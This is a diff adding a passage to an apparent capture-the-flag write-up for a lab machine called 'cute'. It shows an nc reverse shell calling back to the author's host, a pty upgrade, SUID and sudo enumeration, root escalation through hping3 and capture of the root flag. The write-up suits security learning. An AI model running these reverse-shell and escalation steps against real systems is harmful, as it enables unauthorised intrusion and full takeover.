@@ -308,7 +308,85 @@ Dropping to a SHELL
 ============================
 
 command > id
-
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+#to get a better shell, try to use nc to create a reverse shell to my host
+#on my host
+└─$ nc -nvlp 4444                         
+listening on [any] 4444 ...
+
+#on target host
+command > nc -nv 10.8.0.234 4444 -e /bin/bash
+
+#back to my host to prompt a python version shell
+python -c "import pty; pty.spawn ('/bin/bash')"
+www-data@cute:/var/www/html/uploads$
+
+#list the priviledge of www-data, hping3 can be run without root passwd 
+www-data@cute:/var/www/html/uploads$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on cute:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on cute:
+    (root) NOPASSWD: /usr/sbin/hping3 --icmp
+
+
+#to check if hping3 has the root permission, the result is positive
+www-data@cute:/var/www/html/uploads$ find / -perm /4000 -uid 0 2>/dev/null
+find / -perm /4000 -uid 0 2>/dev/null
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/pkexec
+/usr/bin/sudo
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/mount
+/usr/sbin/hping3
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+
+#from the info of Gtfobins site.
+
+hping3
+
+It can be used to break out from restricted environments by spawning an interactive system shell.
+
+    hping3
+    /bin/sh
+
+
+# on the target host
+
+www-data@cute:/var/www/html/uploads$ sh
+sh
+$ hping3
+hping3
+hping3> id
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
+hping3> ls /root/root.txt
+ls /root/root.txt
+/root/root.txt
+hping3> cat /root/root.txt
+cat /root/root.txt
+0b18032c2d06d9e738ede9bc24795ff2
+
+#finally, got the flag!
+
+
+
+
+
+
+
+
+
 
 
